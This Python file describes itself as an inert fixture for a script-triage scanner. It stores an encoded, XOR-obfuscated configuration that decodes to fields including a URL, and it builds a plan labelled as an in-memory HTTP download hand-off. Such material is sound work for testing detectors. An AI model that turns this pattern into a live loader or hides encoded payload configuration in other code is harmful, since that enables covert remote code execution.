#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_a4ae759c = "cUx-AnEFYBBjXj9cLVgxQyZ5C24DbBh9UTVcL18-SilBHnMWexRmH2MCZgd3A2YUKUE1QTFuDWEIbQN3KEUgTSJQKVUmUjNUMW4NYhd5DTABfQ53GW0MdEklTD9LFHcYdQV3EnofcQJrBGoWeRt9CHsYeQ1kC2VYPlEjTi9bBGkIeARnBnQGbwp4RTJaP1o2aQh6GXEYbgt3AGkHYwx7CFc0XD1UOgd3GG8KeAtjBmoGWS1CHW0UYAhnCXUWdxpqC2IFazRdOQRnBmsbehN0GjcDZQc3VGdTYgQ3Sz5MIB11AXUFdkxjTHgefEwvHCgZf0xiB38ecwNvCiRNI1U0WDFVehguG3pOekkqBHQNcQR3EmA_XjlcMkZ7M0YoXC5LOEsbYhZ-EX9QZAJgUDMANAVjUA=="

CODEC_a4ae759c = "urlsafe_base64|rolling_xor|07"



def load_a4ae759c():

    return base64.urlsafe_b64decode(MATERIAL_a4ae759c)



def decode_a4ae759c(v_a19c):

    v_b27e = bytearray()

    v_e598 = 7

    for value in v_a19c:

        v_b27e.append(value ^ v_e598)

        v_e598 = value

    return bytes(v_b27e)



def recover_a4ae759c():

    v_d41a = (3, 5, 8, 13)[1:3]

    try:

        v_b27e = decode_a4ae759c(load_a4ae759c())

    except (TypeError, ValueError) as error:

        raise RuntimeError("configuration recovery failed") from error

    v_c304 = v_b27e.decode("ascii", "strict")

    return v_c304



def inspect_a4ae759c():

    view = memoryview(recover_a4ae759c().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_a4ae759c():

    return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))



def obfuscation_a4ae759c():

    return "{left}{right}".format_map({"left": "format_", "right": "map"})



def plan_a4ae759c():

    fields = dict(item.split("=", 1) for item in inspect_a4ae759c().split("|"))

    analysis_surface = surface_a4ae759c()

    obfuscation_surface = obfuscation_a4ae759c()

    operation_plan = ("http_client_memory", fields["url"], "memory-handoff")

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_a4ae759c())

